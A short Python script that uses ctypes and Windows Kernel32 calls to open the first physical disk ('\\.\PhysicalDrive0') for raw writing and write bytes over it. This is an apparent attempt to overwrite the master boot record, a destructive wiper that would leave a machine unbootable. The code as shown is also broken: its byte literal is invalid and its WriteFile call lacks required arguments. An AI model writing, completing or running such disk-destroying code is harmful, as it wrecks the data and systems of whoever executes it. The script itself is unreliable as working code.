import ctypes
from sys import exit

data = bytes([0,256])

dll = ctypes.windll
hD = dll.Kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0) 
dll.Kernel32.WriteFile(hD, data, None)
dll.Kernel32.CloseHandle(hD) 
